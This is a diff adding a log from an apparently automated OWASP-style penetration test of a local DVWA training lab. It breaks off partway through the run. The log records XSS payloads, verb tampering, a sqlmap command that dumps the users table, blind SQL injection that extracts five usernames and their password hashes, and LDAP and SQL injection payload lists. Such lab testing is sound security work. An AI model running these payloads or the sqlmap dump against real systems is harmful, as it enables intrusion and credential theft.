@@ -1,0 +1,1398 @@
+2025-08-05 01:11:46.553713 | [+] Login successful (Status: 200)
+2025-08-05 01:11:46.617899 | [+] Security level set to low
+2025-08-05 01:11:46.617899 | ----- Starting OTG-INPVAL-001 (Reflected XSS) -----
+2025-08-05 01:11:46.623857 | [✓] Reflected XSS payload found in response! URL: http://localhost:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
+2025-08-05 01:11:46.623857 | ----- OTG-INPVAL-001 Test Completed -----
+
+2025-08-05 01:11:46.623857 | ----- Starting OTG-INPVAL-002 (Stored XSS) -----
+2025-08-05 01:11:46.689628 | [+] Payload submitted (Status: 200) | Payload: <script>alert("XSS")</script>
+2025-08-05 01:11:46.694186 | [✓] XSS payload found in response — likely vulnerable to Stored XSS
+2025-08-05 01:11:46.695860 | ----- OTG-INPVAL-002 Test Completed -----
+
+2025-08-05 01:11:46.695860 | ----- Starting OTG-INPVAL-003 (HTTP Verb Tampering) -----
+2025-08-05 01:11:46.699921 | [GET] Status: 200 | Length: 4323 
+2025-08-05 01:11:46.703611 | [POST] Status: 200 | Length: 4323 
+2025-08-05 01:11:46.706627 | [PUT] Status: 200 | Length: 4323 ⚠️ Same length as GET — potential handler fallback or misconfig
+2025-08-05 01:11:46.706627 | [DELETE] Status: 200 | Length: 4323 ⚠️ Same length as GET — potential handler fallback or misconfig
+2025-08-05 01:11:46.706627 | [OPTIONS] Status: 200 | Length: 4323 
+2025-08-05 01:11:46.713860 | [HEAD] Status: 200 | Length: 0 
+2025-08-05 01:11:46.719682 | [PATCH] Status: 200 | Length: 4323 ⚠️ Same length as GET — potential handler fallback or misconfig
+2025-08-05 01:11:46.721866 | [TRACE] Status: 405 | Length: 322 
+2025-08-05 01:11:46.721866 | ----- OTG-INPVAL-003 Test Completed -----
+
+2025-08-05 01:11:46.722868 | ----- Starting OTG-INPVAL-004 (HTTP Parameter Pollution) -----
+2025-08-05 01:11:46.722868 | 
+[+] Testing URL: http://localhost:8080/vulnerabilities/xss_r/
+2025-08-05 01:11:46.729800 |   ! Vulnerable parameter found: name (last value processed)
+2025-08-05 01:11:46.729800 | 
+[+] Testing URL: http://localhost:8080/vulnerabilities/xss_s/
+2025-08-05 01:11:46.783487 |   - No reflection found for: txtName
+2025-08-05 01:11:46.840965 |   - No reflection found for: btnSign
+2025-08-05 01:11:46.903671 |   - No reflection found for: btnClear
+2025-08-05 01:11:46.905468 | 
+[+] Testing URL: http://localhost:8080/vulnerabilities/sqli/
+2025-08-05 01:11:46.913795 |   - No reflection found for: id
+2025-08-05 01:11:46.918877 |   - No reflection found for: Submit
+2025-08-05 01:11:46.918877 | 
+[+] Testing URL: http://localhost:8080/vulnerabilities/fi/
+2025-08-05 01:11:46.925957 |   - No form found, skipping...
+2025-08-05 01:11:46.925957 | ----- OTG-INPVAL-004 Test Completed -----
+
+2025-08-05 01:11:46.925957 | ----- Starting OTG-INPVAL-005 (SQL Injection) -----
+2025-08-05 01:11:46.925957 | [i] Running sqlmap command: python C:\Users\Alden\Downloads\WSTG\INPVAL\sqlmap-dev\sqlmap.py -u http://localhost:8080/vulnerabilities/sqli/ --batch --level=2 --risk=1 --random-agent --smart --banner --cookie PHPSESSID=pp0vr1t7tjekh977dombapfjq1; security=low; security=low --data id=1&Submit=Submit -D dvwa -T users --dump
+2025-08-05 01:11:47.901207 | [+] sqlmap output saved to sqlmap_output_20250805_011146.txt
+2025-08-05 01:11:47.901207 | ----- OTG-INPVAL-005 Test Completed -----
+
+2025-08-05 01:11:47.901207 | ----- Starting OTG-INPVAL-005-Blind (Blind SQL Injection) -----
+2025-08-05 01:11:47.901207 | [i] Extracting username #1 via blind SQLi
+2025-08-05 01:11:47.906820 | [+] Char 1: a
+2025-08-05 01:11:47.921431 | [+] Char 2: d
+2025-08-05 01:11:47.960261 | [+] Char 3: m
+2025-08-05 01:11:47.986822 | [+] Char 4: i
+2025-08-05 01:11:48.023884 | [+] Char 5: n
+2025-08-05 01:11:48.127149 | [✓] Extracted username #1: admin
+2025-08-05 01:11:48.127149 | [i] Extracting password hash #1 via blind SQLi
+2025-08-05 01:11:48.215740 | [+] Char 1: 5
+2025-08-05 01:11:48.230885 | [+] Char 2: f
+2025-08-05 01:11:48.316335 | [+] Char 3: 4
+2025-08-05 01:11:48.329415 | [+] Char 4: d
+2025-08-05 01:11:48.339421 | [+] Char 5: c
+2025-08-05 01:11:48.349739 | [+] Char 6: c
+2025-08-05 01:11:48.436177 | [+] Char 7: 3
+2025-08-05 01:11:48.440009 | [+] Char 8: b
+2025-08-05 01:11:48.528253 | [+] Char 9: 5
+2025-08-05 01:11:48.534983 | [+] Char 10: a
+2025-08-05 01:11:48.536506 | [+] Char 11: a
+2025-08-05 01:11:48.641385 | [+] Char 12: 7
+2025-08-05 01:11:48.739321 | [+] Char 13: 6
+2025-08-05 01:11:48.826985 | [+] Char 14: 5
+2025-08-05 01:11:48.839589 | [+] Char 15: d
+2025-08-05 01:11:48.928574 | [+] Char 16: 6
+2025-08-05 01:11:49.010351 | [+] Char 17: 1
+2025-08-05 01:11:49.020108 | [+] Char 18: d
+2025-08-05 01:11:49.113570 | [+] Char 19: 8
+2025-08-05 01:11:49.198780 | [+] Char 20: 3
+2025-08-05 01:11:49.281313 | [+] Char 21: 2
+2025-08-05 01:11:49.377892 | [+] Char 22: 7
+2025-08-05 01:11:49.393653 | [+] Char 23: d
+2025-08-05 01:11:49.408195 | [+] Char 24: e
+2025-08-05 01:11:49.413586 | [+] Char 25: b
+2025-08-05 01:11:49.507943 | [+] Char 26: 8
+2025-08-05 01:11:49.607633 | [+] Char 27: 8
+2025-08-05 01:11:49.685425 | [+] Char 28: 2
+2025-08-05 01:11:49.695406 | [+] Char 29: c
+2025-08-05 01:11:49.713469 | [+] Char 30: f
+2025-08-05 01:11:49.812717 | [+] Char 31: 9
+2025-08-05 01:11:49.907998 | [+] Char 32: 9
+2025-08-05 01:11:50.003943 | [✓] Extracted password hash #1: 5f4dcc3b5aa765d61d8327deb882cf99
+2025-08-05 01:11:50.003943 | [✓] User #1: admin | Hash: 5f4dcc3b5aa765d61d8327deb882cf99
+
+2025-08-05 01:11:50.003943 | [i] Extracting username #2 via blind SQLi
+2025-08-05 01:11:50.023611 | [+] Char 1: g
+2025-08-05 01:11:50.063475 | [+] Char 2: o
+2025-08-05 01:11:50.109503 | [+] Char 3: r
+2025-08-05 01:11:50.123458 | [+] Char 4: d
+2025-08-05 01:11:50.163719 | [+] Char 5: o
+2025-08-05 01:11:50.197080 | [+] Char 6: n
+2025-08-05 01:11:50.203501 | [+] Char 7: b
+2025-08-05 01:11:50.295605 | [✓] Extracted username #2: gordonb
+2025-08-05 01:11:50.295605 | [i] Extracting password hash #2 via blind SQLi
+2025-08-05 01:11:50.310046 | [+] Char 1: e
+2025-08-05 01:11:50.413008 | [+] Char 2: 9
+2025-08-05 01:11:50.509029 | [+] Char 3: 9
+2025-08-05 01:11:50.509029 | [+] Char 4: a
+2025-08-05 01:11:50.584789 | [+] Char 5: 1
+2025-08-05 01:11:50.683136 | [+] Char 6: 8
+2025-08-05 01:11:50.691327 | [+] Char 7: c
+2025-08-05 01:11:50.763747 | [+] Char 8: 4
+2025-08-05 01:11:50.843777 | [+] Char 9: 2
+2025-08-05 01:11:50.933618 | [+] Char 10: 8
+2025-08-05 01:11:50.945154 | [+] Char 11: c
+2025-08-05 01:11:50.953575 | [+] Char 12: b
+2025-08-05 01:11:51.032141 | [+] Char 13: 3
+2025-08-05 01:11:51.122437 | [+] Char 14: 8
+2025-08-05 01:11:51.132562 | [+] Char 15: d
+2025-08-05 01:11:51.218019 | [+] Char 16: 5
+2025-08-05 01:11:51.233544 | [+] Char 17: f
+2025-08-05 01:11:51.310039 | [+] Char 18: 2
+2025-08-05 01:11:51.395460 | [+] Char 19: 6
+2025-08-05 01:11:51.473477 | [+] Char 20: 0
+2025-08-05 01:11:51.575900 | [+] Char 21: 8
+2025-08-05 01:11:51.699530 | [+] Char 22: 5
+2025-08-05 01:11:51.825594 | [+] Char 23: 3
+2025-08-05 01:11:51.913526 | [+] Char 24: 6
+2025-08-05 01:11:52.020059 | [+] Char 25: 7
+2025-08-05 01:11:52.131267 | [+] Char 26: 8
+2025-08-05 01:11:52.235849 | [+] Char 27: 9
+2025-08-05 01:11:52.326220 | [+] Char 28: 2
+2025-08-05 01:11:52.425554 | [+] Char 29: 2
+2025-08-05 01:11:52.438431 | [+] Char 30: e
+2025-08-05 01:11:52.518445 | [+] Char 31: 0
+2025-08-05 01:11:52.593747 | [+] Char 32: 3
+2025-08-05 01:11:52.701190 | [✓] Extracted password hash #2: e99a18c428cb38d5f260853678922e03
+2025-08-05 01:11:52.701604 | [✓] User #2: gordonb | Hash: e99a18c428cb38d5f260853678922e03
+
+2025-08-05 01:11:52.701604 | [i] Extracting username #3 via blind SQLi
+2025-08-05 01:11:52.781895 | [+] Char 1: 1
+2025-08-05 01:11:52.863183 | [+] Char 2: 3
+2025-08-05 01:11:52.941029 | [+] Char 3: 3
+2025-08-05 01:11:53.034813 | [+] Char 4: 7
+2025-08-05 01:11:53.128960 | [✓] Extracted username #3: 1337
+2025-08-05 01:11:53.128960 | [i] Extracting password hash #3 via blind SQLi
+2025-08-05 01:11:53.217673 | [+] Char 1: 8
+2025-08-05 01:11:53.225347 | [+] Char 2: d
+2025-08-05 01:11:53.313986 | [+] Char 3: 3
+2025-08-05 01:11:53.394014 | [+] Char 4: 5
+2025-08-05 01:11:53.473569 | [+] Char 5: 3
+2025-08-05 01:11:53.555037 | [+] Char 6: 3
+2025-08-05 01:11:53.565597 | [+] Char 7: d
+2025-08-05 01:11:53.663766 | [+] Char 8: 7
+2025-08-05 01:11:53.752341 | [+] Char 9: 5
+2025-08-05 01:11:53.755902 | [+] Char 10: a
+2025-08-05 01:11:53.769040 | [+] Char 11: e
+2025-08-05 01:11:53.843730 | [+] Char 12: 2
+2025-08-05 01:11:53.855814 | [+] Char 13: c
+2025-08-05 01:11:53.933767 | [+] Char 14: 3
+2025-08-05 01:11:54.023781 | [+] Char 15: 9
+2025-08-05 01:11:54.105074 | [+] Char 16: 6
+2025-08-05 01:11:54.193580 | [+] Char 17: 6
+2025-08-05 01:11:54.204425 | [+] Char 18: d
+2025-08-05 01:11:54.293909 | [+] Char 19: 7
+2025-08-05 01:11:54.303735 | [+] Char 20: e
+2025-08-05 01:11:54.373943 | [+] Char 21: 0
+2025-08-05 01:11:54.393811 | [+] Char 22: d
+2025-08-05 01:11:54.473866 | [+] Char 23: 4
+2025-08-05 01:11:54.488599 | [+] Char 24: f
+2025-08-05 01:11:54.496324 | [+] Char 25: c
+2025-08-05 01:11:54.503832 | [+] Char 26: c
+2025-08-05 01:11:54.617719 | [+] Char 27: 6
+2025-08-05 01:11:54.709001 | [+] Char 28: 9
+2025-08-05 01:11:54.783706 | [+] Char 29: 2
+2025-08-05 01:11:54.855635 | [+] Char 30: 1
+2025-08-05 01:11:54.939779 | [+] Char 31: 6
+2025-08-05 01:11:54.943794 | [+] Char 32: b
+2025-08-05 01:11:55.033862 | [✓] Extracted password hash #3: 8d3533d75ae2c3966d7e0d4fcc69216b
+2025-08-05 01:11:55.033862 | [✓] User #3: 1337 | Hash: 8d3533d75ae2c3966d7e0d4fcc69216b
+
+2025-08-05 01:11:55.033862 | [i] Extracting username #4 via blind SQLi
+2025-08-05 01:11:55.073997 | [+] Char 1: p
+2025-08-05 01:11:55.081822 | [+] Char 2: a
+2025-08-05 01:11:55.088876 | [+] Char 3: b
+2025-08-05 01:11:55.118720 | [+] Char 4: l
+2025-08-05 01:11:55.161279 | [+] Char 5: o
+2025-08-05 01:11:55.246456 | [✓] Extracted username #4: pablo
+2025-08-05 01:11:55.246456 | [i] Extracting password hash #4 via blind SQLi
+2025-08-05 01:11:55.320673 | [+] Char 1: 0
+2025-08-05 01:11:55.333770 | [+] Char 2: d
+2025-08-05 01:11:55.403931 | [+] Char 3: 1
+2025-08-05 01:11:55.473979 | [+] Char 4: 0
+2025-08-05 01:11:55.563610 | [+] Char 5: 7
+2025-08-05 01:11:55.583630 | [+] Char 6: d
+2025-08-05 01:11:55.653778 | [+] Char 7: 0
+2025-08-05 01:11:55.760774 | [+] Char 8: 9
+2025-08-05 01:11:55.773876 | [+] Char 9: f
+2025-08-05 01:11:55.863801 | [+] Char 10: 5
+2025-08-05 01:11:55.868841 | [+] Char 11: b
+2025-08-05 01:11:55.873855 | [+] Char 12: b
+2025-08-05 01:11:55.888906 | [+] Char 13: e
+2025-08-05 01:11:55.983698 | [+] Char 14: 4
+2025-08-05 01:11:56.043619 | [+] Char 15: 0
+2025-08-05 01:11:56.054958 | [+] Char 16: c
+2025-08-05 01:11:56.063799 | [+] Char 17: a
+2025-08-05 01:11:56.075868 | [+] Char 18: d
+2025-08-05 01:11:56.089651 | [+] Char 19: e
+2025-08-05 01:11:56.165474 | [+] Char 20: 3
+2025-08-05 01:11:56.179071 | [+] Char 21: d
+2025-08-05 01:11:56.188770 | [+] Char 22: e
+2025-08-05 01:11:56.273820 | [+] Char 23: 5
+2025-08-05 01:11:56.287917 | [+] Char 24: c
+2025-08-05 01:11:56.379630 | [+] Char 25: 7
+2025-08-05 01:11:56.472593 | [+] Char 26: 1
+2025-08-05 01:11:56.486749 | [+] Char 27: e
+2025-08-05 01:11:56.585935 | [+] Char 28: 9
+2025-08-05 01:11:56.601267 | [+] Char 29: e
+2025-08-05 01:11:56.706612 | [+] Char 30: 9
+2025-08-05 01:11:56.713237 | [+] Char 31: b
+2025-08-05 01:11:56.805549 | [+] Char 32: 7
+2025-08-05 01:11:56.905912 | [✓] Extracted password hash #4: 0d107d09f5bbe40cade3de5c71e9e9b7
+2025-08-05 01:11:56.906416 | [✓] User #4: pablo | Hash: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+2025-08-05 01:11:56.906947 | [i] Extracting username #5 via blind SQLi
+2025-08-05 01:11:56.962468 | [+] Char 1: s
+2025-08-05 01:11:56.994020 | [+] Char 2: m
+2025-08-05 01:11:57.015467 | [+] Char 3: i
+2025-08-05 01:11:57.066590 | [+] Char 4: t
+2025-08-05 01:11:57.088666 | [+] Char 5: h
+2025-08-05 01:11:57.154027 | [+] Char 6: y
+2025-08-05 01:11:57.249316 | [✓] Extracted username #5: smithy
+2025-08-05 01:11:57.249316 | [i] Extracting password hash #5 via blind SQLi
+2025-08-05 01:11:57.333917 | [+] Char 1: 5
+2025-08-05 01:11:57.349011 | [+] Char 2: f
+2025-08-05 01:11:57.438937 | [+] Char 3: 4
+2025-08-05 01:11:57.453631 | [+] Char 4: d
+2025-08-05 01:11:57.454652 | [+] Char 5: c
+2025-08-05 01:11:57.465581 | [+] Char 6: c
+2025-08-05 01:11:57.549771 | [+] Char 7: 3
+2025-08-05 01:11:57.555665 | [+] Char 8: b
+2025-08-05 01:11:57.642582 | [+] Char 9: 5
+2025-08-05 01:11:57.645939 | [+] Char 10: a
+2025-08-05 01:11:57.649616 | [+] Char 11: a
+2025-08-05 01:11:57.752712 | [+] Char 12: 7
+2025-08-05 01:11:57.839134 | [+] Char 13: 6
+2025-08-05 01:11:57.926865 | [+] Char 14: 5
+2025-08-05 01:11:57.933824 | [+] Char 15: d
+2025-08-05 01:11:58.021759 | [+] Char 16: 6
+2025-08-05 01:11:58.094008 | [+] Char 17: 1
+2025-08-05 01:11:58.104089 | [+] Char 18: d
+2025-08-05 01:11:58.198819 | [+] Char 19: 8
+2025-08-05 01:11:58.275593 | [+] Char 20: 3
+2025-08-05 01:11:58.346479 | [+] Char 21: 2
+2025-08-05 01:11:58.433993 | [+] Char 22: 7
+2025-08-05 01:11:58.450438 | [+] Char 23: d
+2025-08-05 01:11:58.463702 | [+] Char 24: e
+2025-08-05 01:11:58.463702 | [+] Char 25: b
+2025-08-05 01:11:58.562576 | [+] Char 26: 8
+2025-08-05 01:11:58.655192 | [+] Char 27: 8
+2025-08-05 01:11:58.739067 | [+] Char 28: 2
+2025-08-05 01:11:58.748507 | [+] Char 29: c
+2025-08-05 01:11:58.764145 | [+] Char 30: f
+2025-08-05 01:11:58.858676 | [+] Char 31: 9
+2025-08-05 01:11:58.953726 | [+] Char 32: 9
+2025-08-05 01:11:59.052026 | [✓] Extracted password hash #5: 5f4dcc3b5aa765d61d8327deb882cf99
+2025-08-05 01:11:59.052026 | [✓] User #5: smithy | Hash: 5f4dcc3b5aa765d61d8327deb882cf99
+
+2025-08-05 01:11:59.052877 | [i] Extracting username #6 via blind SQLi
+2025-08-05 01:11:59.146669 | [✓] Extracted username #6: 
+2025-08-05 01:11:59.146669 | [i] No username found at index 5, stopping.
+2025-08-05 01:11:59.146669 | ----- OTG-INPVAL-005-Blind Test Completed -----
+
+2025-08-05 01:11:59.153813 | ----- Starting OTG-INPVAL-006 (LDAP Injection) -----
+2025-08-05 01:11:59.153813 | [i] Testing LDAP injection in search functionality
+2025-08-05 01:11:59.153813 | [-] Payload '*' - No obvious injection
+2025-08-05 01:11:59.160752 | [-] Payload '*)(uid=*))(|(uid=*' - No obvious injection
+2025-08-05 01:11:59.164262 | [-] Payload 'admin)(|(password=*' - No obvious injection
+2025-08-05 01:11:59.167781 | [-] Payload 'admin*' - No obvious injection
+2025-08-05 01:11:59.168925 | [-] Payload '*admin' - No obvious injection
+2025-08-05 01:11:59.174897 | [-] Payload ')(cn=*))%00' - No obvious injection
+2025-08-05 01:11:59.174897 | [-] Payload '(|(cn=*' - No obvious injection
+2025-08-05 01:11:59.183681 | [-] Payload '(&(cn=*' - No obvious injection
+2025-08-05 01:11:59.186685 | [-] Payload '!(cn=test)' - No obvious injection
+2025-08-05 01:11:59.190988 | [-] Payload 'admin)(|(objectclass=*' - No obvious injection
+2025-08-05 01:11:59.194282 | [-] Payload '\2a' - No obvious injection
+2025-08-05 01:11:59.198291 | [-] Payload '\28\29' - No obvious injection
+2025-08-05 01:11:59.201288 | [-] Payload '\00' - No obvious injection
+2025-08-05 01:11:59.201288 | 
+[i] Testing LDAP authentication bypass
+2025-08-05 01:11:59.253990 | [-] LDAP auth bypass failed with payload '*)(uid=*))(|(uid=*'
+2025-08-05 01:11:59.312002 | [-] LDAP auth bypass failed with payload 'admin)(|(password=*'
+2025-08-05 01:11:59.367323 | [-] LDAP auth bypass failed with payload '*)(objectclass=*))(|(uid=*'
+2025-08-05 01:11:59.367323 | ----- OTG-INPVAL-006 Test Completed -----
+
+2025-08-05 01:11:59.367323 | ----- Starting OTG-INPVAL-007 (ORM Injection) -----
+2025-08-05 01:11:59.367323 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/sqli/
+2025-08-05 01:11:59.373979 |   - Testing parameter: id
+2025-08-05 01:11:59.373979 |     [i] Testing payload: ' OR 1=1--
+2025-08-05 01:11:59.373979 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.380897 |     [!] Possible ORM injection - Error with payload '' OR 1=1--'
+2025-08-05 01:11:59.380897 |     [i] Testing payload: ' OR ''='
+2025-08-05 01:11:59.380897 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.384728 |     [-] No obvious injection with payload '' OR ''=''
+2025-08-05 01:11:59.385775 |     [i] Testing payload: ') OR ('1'='1
+2025-08-05 01:11:59.385775 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.389171 |     [!] Possible ORM injection - Error with payload '') OR ('1'='1'
+2025-08-05 01:11:59.389171 |     [i] Testing payload: 1 ORDER BY 1--
+2025-08-05 01:11:59.389171 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.394119 |     [-] No obvious injection with payload '1 ORDER BY 1--'
+2025-08-05 01:11:59.394642 |     [i] Testing payload: 1 UNION SELECT 1,2,3--
+2025-08-05 01:11:59.394642 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.398145 |     [-] No obvious injection with payload '1 UNION SELECT 1,2,3--'
+2025-08-05 01:11:59.399145 |     [i] Testing payload: *
+2025-08-05 01:11:59.399145 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.403069 |     [-] No obvious injection with payload '*'
+2025-08-05 01:11:59.404040 |     [i] Testing payload: null
+2025-08-05 01:11:59.404040 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.404040 |     [-] No obvious injection with payload 'null'
+2025-08-05 01:11:59.404040 |   - Testing parameter: Submit
+2025-08-05 01:11:59.404040 |     [i] Testing payload: ' OR 1=1--
+2025-08-05 01:11:59.404040 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.412528 |     [-] No obvious injection with payload '' OR 1=1--'
+2025-08-05 01:11:59.412528 |     [i] Testing payload: ' OR ''='
+2025-08-05 01:11:59.412528 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.416040 |     [-] No obvious injection with payload '' OR ''=''
+2025-08-05 01:11:59.417041 |     [i] Testing payload: ') OR ('1'='1
+2025-08-05 01:11:59.417041 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.420241 |     [-] No obvious injection with payload '') OR ('1'='1'
+2025-08-05 01:11:59.421238 |     [i] Testing payload: 1 ORDER BY 1--
+2025-08-05 01:11:59.421238 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.423925 |     [-] No obvious injection with payload '1 ORDER BY 1--'
+2025-08-05 01:11:59.423925 |     [i] Testing payload: 1 UNION SELECT 1,2,3--
+2025-08-05 01:11:59.424929 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.424929 |     [-] No obvious injection with payload '1 UNION SELECT 1,2,3--'
+2025-08-05 01:11:59.424929 |     [i] Testing payload: *
+2025-08-05 01:11:59.424929 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.431906 |     [-] No obvious injection with payload '*'
+2025-08-05 01:11:59.431906 |     [i] Testing payload: null
+2025-08-05 01:11:59.431906 |     [i] Request to: http://localhost:8080/vulnerabilities/sqli/ (GET)
+2025-08-05 01:11:59.435284 |     [-] No obvious injection with payload 'null'
+2025-08-05 01:11:59.436282 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/brute/
+2025-08-05 01:11:59.438919 |   - Testing parameter: username
+2025-08-05 01:11:59.438919 |     [i] Testing payload: ' OR 1=1--
+2025-08-05 01:11:59.438919 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.445345 |     [!] Possible ORM injection - Error with payload '' OR 1=1--'
+2025-08-05 01:11:59.445713 |     [i] Testing payload: ' OR ''='
+2025-08-05 01:11:59.446035 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.449265 |     [-] No obvious injection with payload '' OR ''=''
+2025-08-05 01:11:59.449265 |     [i] Testing payload: ') OR ('1'='1
+2025-08-05 01:11:59.449265 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.453603 |     [!] Possible ORM injection - Error with payload '') OR ('1'='1'
+2025-08-05 01:11:59.453603 |     [i] Testing payload: 1 ORDER BY 1--
+2025-08-05 01:11:59.454108 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.459813 |     [-] No obvious injection with payload '1 ORDER BY 1--'
+2025-08-05 01:11:59.459813 |     [i] Testing payload: 1 UNION SELECT 1,2,3--
+2025-08-05 01:11:59.460816 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.464106 |     [-] No obvious injection with payload '1 UNION SELECT 1,2,3--'
+2025-08-05 01:11:59.464106 |     [i] Testing payload: *
+2025-08-05 01:11:59.464106 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.467693 |     [-] No obvious injection with payload '*'
+2025-08-05 01:11:59.468693 |     [i] Testing payload: null
+2025-08-05 01:11:59.469024 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.472537 |     [-] No obvious injection with payload 'null'
+2025-08-05 01:11:59.472537 |   - Testing parameter: password
+2025-08-05 01:11:59.472537 |     [i] Testing payload: ' OR 1=1--
+2025-08-05 01:11:59.472537 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.476881 |     [-] No obvious injection with payload '' OR 1=1--'
+2025-08-05 01:11:59.477344 |     [i] Testing payload: ' OR ''='
+2025-08-05 01:11:59.477649 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.480536 |     [-] No obvious injection with payload '' OR ''=''
+2025-08-05 01:11:59.480536 |     [i] Testing payload: ') OR ('1'='1
+2025-08-05 01:11:59.481549 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.484954 |     [-] No obvious injection with payload '') OR ('1'='1'
+2025-08-05 01:11:59.485429 |     [i] Testing payload: 1 ORDER BY 1--
+2025-08-05 01:11:59.485738 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.489527 |     [-] No obvious injection with payload '1 ORDER BY 1--'
+2025-08-05 01:11:59.489527 |     [i] Testing payload: 1 UNION SELECT 1,2,3--
+2025-08-05 01:11:59.489527 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.493378 |     [-] No obvious injection with payload '1 UNION SELECT 1,2,3--'
+2025-08-05 01:11:59.493818 |     [i] Testing payload: *
+2025-08-05 01:11:59.493818 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.497033 |     [-] No obvious injection with payload '*'
+2025-08-05 01:11:59.497033 |     [i] Testing payload: null
+2025-08-05 01:11:59.498035 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.501122 |     [-] No obvious injection with payload 'null'
+2025-08-05 01:11:59.501534 |   - Testing parameter: Login
+2025-08-05 01:11:59.501534 |     [i] Testing payload: ' OR 1=1--
+2025-08-05 01:11:59.501534 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.504870 |     [-] No obvious injection with payload '' OR 1=1--'
+2025-08-05 01:11:59.505869 |     [i] Testing payload: ' OR ''='
+2025-08-05 01:11:59.505869 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.508976 |     [-] No obvious injection with payload '' OR ''=''
+2025-08-05 01:11:59.509983 |     [i] Testing payload: ') OR ('1'='1
+2025-08-05 01:11:59.509983 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.513706 |     [-] No obvious injection with payload '') OR ('1'='1'
+2025-08-05 01:11:59.513706 |     [i] Testing payload: 1 ORDER BY 1--
+2025-08-05 01:11:59.513706 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.516720 |     [-] No obvious injection with payload '1 ORDER BY 1--'
+2025-08-05 01:11:59.517720 |     [i] Testing payload: 1 UNION SELECT 1,2,3--
+2025-08-05 01:11:59.517720 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.521138 |     [-] No obvious injection with payload '1 UNION SELECT 1,2,3--'
+2025-08-05 01:11:59.521138 |     [i] Testing payload: *
+2025-08-05 01:11:59.521138 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.523699 |     [-] No obvious injection with payload '*'
+2025-08-05 01:11:59.523699 |     [i] Testing payload: null
+2025-08-05 01:11:59.523699 |     [i] Request to: http://localhost:8080/vulnerabilities/brute/ (GET)
+2025-08-05 01:11:59.528726 |     [-] No obvious injection with payload 'null'
+2025-08-05 01:11:59.528726 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/xss_s/
+2025-08-05 01:11:59.533733 |   - Testing parameter: txtName
+2025-08-05 01:11:59.533733 |     [i] Testing payload: ' OR 1=1--
+2025-08-05 01:11:59.533733 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:11:59.597859 |     [-] No obvious injection with payload '' OR 1=1--'
+2025-08-05 01:11:59.597859 |     [i] Testing payload: ' OR ''='
+2025-08-05 01:11:59.599007 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:11:59.657434 |     [-] No obvious injection with payload '' OR ''=''
+2025-08-05 01:11:59.657434 |     [i] Testing payload: ') OR ('1'='1
+2025-08-05 01:11:59.658431 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:11:59.716728 |     [-] No obvious injection with payload '') OR ('1'='1'
+2025-08-05 01:11:59.716728 |     [i] Testing payload: 1 ORDER BY 1--
+2025-08-05 01:11:59.717726 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:11:59.782002 |     [-] No obvious injection with payload '1 ORDER BY 1--'
+2025-08-05 01:11:59.782002 |     [i] Testing payload: 1 UNION SELECT 1,2,3--
+2025-08-05 01:11:59.783002 |     [i] Request to: http://localhost:8080/vulnerabilities/xss_s/ (POST)
+2025-08-05 01:11:59.843930 |     [-] No obvious injection with payload '1 UNION SELECT 1,2,3--'
